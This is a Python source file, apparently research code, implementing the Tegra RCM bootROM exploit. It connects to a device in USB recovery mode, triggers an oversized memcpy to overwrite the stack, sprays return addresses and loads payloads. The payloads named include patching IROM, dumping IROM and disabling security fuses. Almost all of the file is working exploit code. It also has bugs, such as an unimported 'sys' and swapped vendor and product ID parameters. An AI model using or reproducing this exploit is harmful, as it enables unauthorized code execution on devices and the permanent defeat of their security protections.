from abc import ABC

from usb_backend import HaxBackend

IRAM_END = 0x40040000
USB_XFER_MAX = 0x1000

class RCMHax(ABC):

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
        """ Set up our RCM hack connection."""

        # The first write into the bootROM touches the lowbuffer.
        self.current_buffer = 0

        # Keep track of the total amount written.
        self.total_written = 0

        # Create a vulnerability backend for the given device.
        try:
            self.backend = HaxBackend.create_appropriate_backend(system_override=os_override, skip_checks=override_checks)
        except IOError:
            print("It doesn't look like we support your OS, currently. Sorry about that!\n")
            sys.exit(-1)

        # Grab a connection to the USB device itself.
        self.dev = self._find_device(vid, pid)

        # If we don't have a device...
        if self.dev is None:

            # ... and we're allowed to wait for one, wait indefinitely for one to appear...
            if wait_for_device:
                print("Waiting for a TegraRCM device to come online...")
                while self.dev is None:
                    self.dev = self._find_device(vid, pid)

            # ... or bail out.
            else:
                raise IOError("No TegraRCM device found?")

        # Notify the user of which backend we're using.
        print("Identified a {} system; setting up the appropriate backend.".format(self.backend.BACKEND_NAME))


    def _find_device(self, pid=None, vid=None):
        """ Attempts to get a connection to the RCM device with the given VID and PID. """

        # Apply our default VID and PID if neither are provided...
        #pid = pid if pid else self.DEFAULT_PID

        # ... and use them to find a USB device.
        return self.backend.find_device(0x0955, vid)

    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return self.backend.read(length)


    def write(self, data):
        """ Writes data to the main RCM protocol endpoint. """

        length = len(data)
        packet_size = USB_XFER_MAX

        while length:
            data_to_transmit = min(length, packet_size)
            length -= data_to_transmit

            chunk = data[:data_to_transmit]
            data  = data[data_to_transmit:]
            self.write_single_buffer(chunk)


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be USB_XFER_MAX long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        self._toggle_buffer()
        return self.backend.write_single_buffer(data)


    def _toggle_buffer(self):
        """
        Toggles the active target buffer, paralleling the operation happening in
        RCM on the X1 device.
        """
        self.current_buffer = 1 - self.current_buffer


    def get_current_buffer_address(self):
        """ Returns the base address for the current copy. """
        return self.COPY_BUFFER_ADDRESSES[self.current_buffer]


    def read_device_id(self):
        """ Reads the Device ID via RCM. Only valid at the start of the communication. """
        return self.read(16)


    def switch_to_highbuf(self):
        """ Switches to the higher RCM buffer, reducing the amount that needs to be copied. """

        if self.get_current_buffer_address() != self.COPY_BUFFER_ADDRESSES[1]:
            self.write(b'\0' * USB_XFER_MAX)


    def trigger_controlled_memcpy(self, length=None):
        """ Triggers the RCM vulnerability, causing it to make a signficantly-oversized memcpy. """

        # Determine how much we'd need to transmit to smash the full stack.
        if length is None:
            length = self.STACK_END - self.get_current_buffer_address() #- 0x20 # This isn't needed hopefully

        return self.backend.trigger_vulnerability(length)


    def create_rcm_message(self):
######## RCM HEADER ############################################################
        # The max payload size depends on the address of the RCM Payload buffer
        # Add the RCM header size to USB transfer size.
        # Substract 16. IDK they all do it. Test without it.
        rcm_payload_length  = (IRAM_END - self.RCM_PAYLOAD_ADDR) + self.RCM_HEADER_SIZE - 16
        rcm_header = rcm_payload_length.to_bytes(4, byteorder='little')
        # Fill up the RCM header to RCM_HEADER_SIZE otherwise the start of the payload is copied to thhexe RCM command buffer
        rcm_header += b'\0' * (self.RCM_HEADER_SIZE - len(rcm_header))

######## INTERMEZZO ############################################################
        # This is the start of the RCM payload buffer.
        intermezzo_path = "./intermezzo.bin"
        with open(intermezzo_path, "rb") as f:
            intermezzo      = f.read()
            rcm_payload     = intermezzo

######## PAD UNTIL PAYLOAD ADDRESS #############################################
        # Payload should start at a fixed offset so pad until that offset.
        padding_size = self.PAYLOAD_START_OFF - len(rcm_payload)
        padding = b'\0' * padding_size
        rcm_payload += padding

######## PAYLOAD ###############################################################
        # The RCM payload needs to contain the stackspray and therefore the actual payload eventually needs to be splitted.
        # Intermezzo will concat it back together
        payload_part1_max_size = self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1] - self.PAYLOAD_START_OFF
        payload_part2_max_size = (IRAM_END - self.RCM_PAYLOAD_ADDR) - (self.STACK_SPRAY_END - self.COPY_BUFFER_ADDRESSES[1])

        #payload_path = "./payloads/dump_irom.bin"
        #payload_path = "./disable_security_fuses.bin"
        payload_path = "./payloads/patch_irom.bin"
        #payload_path = "uart_payload_n7.bin"
        with open(payload_path, "rb") as f:
            payload      = f.read()

        # Check if payload fits in the available space
        print(payload_part1_max_size)
        print(payload_part2_max_size)
        print(payload_part1_max_size+payload_part2_max_size)
        assert(len(payload) < (payload_part1_max_size+payload_part2_max_size))

        # append first part of payload if payload is larger than the available buffer
        payload_size = min(payload_part1_max_size, len(payload))
        rcm_payload += payload[:payload_size]

######## PAD UNTIL STACK SPRAY ADDRESS #########################################
        padding_size = (self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1]) - len(rcm_payload) #+ self.RCM_HEADER_SIZE
        padding = b'\0' * padding_size
        rcm_payload += padding

######## STACK SPRAY ADDRESS ###################################################
        repeat_count = int((self.STACK_SPRAY_END - self.STACK_SPRAY_START) / 4)
        stack_spray = (self.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
        rcm_payload += stack_spray

######## APPEND 2nd PART OF PAYLOAD ############################################
        if len(payload) - payload_part1_max_size > 0:
            rcm_payload += payload[payload_size:]

######## PAD TO MAX TRANSFER SIZE ##############################################
        # Pad the payload to fill a USB request exactly, so we don't send a short
        # packet and break out of the RCM loop.
        payload_length = len(rcm_header + rcm_payload) #pad the RCM message full USb buffer.
        if (payload_length % USB_XFER_MAX) != 0: #don't pad if we already end at correct alignment
            padding_size   = USB_XFER_MAX - (payload_length % USB_XFER_MAX)
            rcm_payload += (b'\0' * padding_size)

        rcm_message = rcm_header + rcm_payload

        # debug
        #f_rcm_message = open("rcm_message.bin", "wb")
        #f_rcm_message.write(rcm_message)
        #f_rcm_header = open("rcm_header.bin", "wb")
        #f_rcm_header.write(rcm_header)
        #f_rcm_payload = open("rcm_payload.bin", "wb")
        #f_rcm_payload.write(rcm_payload)

        return rcm_message
